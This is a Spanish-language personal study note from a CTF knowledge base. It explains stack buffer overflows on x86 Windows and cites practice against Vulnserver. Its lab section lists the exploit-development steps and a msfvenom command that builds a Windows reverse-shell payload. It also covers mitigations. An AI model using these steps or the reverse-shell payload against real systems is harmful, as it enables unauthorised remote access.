---
tags: [tecnica, reversing, buffer-overflow, windows]
tipo: tecnica
categoria: reversing
estado: practicado
maquinas: [Pila]
---

# Buffer Overflow (stack, x86)

## 1. Qué es

Desbordamiento de un buffer en la pila que permite sobrescribir el **EIP** y ejecutar código (shellcode).

## 2. Cómo funciona

- `strcpy`/`sprintf` sin límite copian más allá del buffer → se controla la dirección de retorno.
- Con un `JMP ESP` (sin ASLR) se salta al shellcode en la pila.

## 3. Cuándo sospecharla

- Servicios que aceptan datos largos y usan funciones inseguras.
- Binarios x86 sin mitigaciones (Server 2008 antiguo).

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
msf-pattern_create -l 3000
# enviar patrón -> leer EIP -> msf-pattern_offset -l 3000 -q <EIP>
# buscar JMP ESP (mona.py / msf)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00" -f c
```

## 5. Herramientas

- `msf-pattern_create`, `msfvenom`, [[Mona.py]]/WinDbg.

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[Pila]] | **Vulnserver** (`TRUN`/`GMON`) en Windows Server 2008 x86 | shell → flags |

## 7. Falsos positivos / pruebas fallidas

- Badchars (`\x00`) invalidan el shellcode si no se filtran.
- Un `JMP ESP` de un módulo **con** ASLR no es fiable.

## 8. Prevención y mitigación

- Funciones seguras con límite; ASLR/DEP/GS; no ejecutar servicios como admin.

## 9. Técnicas relacionadas

- [[Reversing-Token-Validation]]
